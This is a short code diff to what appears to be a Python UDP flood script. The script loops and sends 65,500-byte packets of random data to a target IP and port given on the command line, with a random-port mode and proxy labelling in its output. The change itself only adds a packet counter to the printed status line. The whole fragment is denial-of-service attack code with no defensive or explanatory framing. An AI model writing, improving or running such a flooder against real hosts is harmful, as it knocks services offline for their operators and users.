@@ -47,7 +47,9 @@ def main():
     global randoms
     global port
     global sockets
+    global number
     sockets = 0
+    number = 0
     while True:
         try:
             if sockets == int(sys.argv[4]):
@@ -59,12 +61,13 @@ def main():
             if randoms != 65535:
                 randoms = 1
             randoms = port + 1
+            number = number + 1
             if sys.argv[2] == "random" or sys.argv[2] == "r":
                 port = int(randoms)
             else:
                 port = int(sys.argv[2])
             sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
-            print('\033[97m[\033[92m!\033[97m] \033[93m'+str(randoms),"\033[97m| Packet Sended By\033[96m", str(proxy.rstrip("\n\r")))
+            print('\033[97m[\033[92m!\033[97m] \033[93m'+str(number),"\033[97m| Packet Sended By\033[96m", str(proxy.rstrip("\n\r")))
         except socket.error:
             sock.sendto(random._urandom(65500),(str(sys.argv[1]),int(port)))
         except socket.timeout:
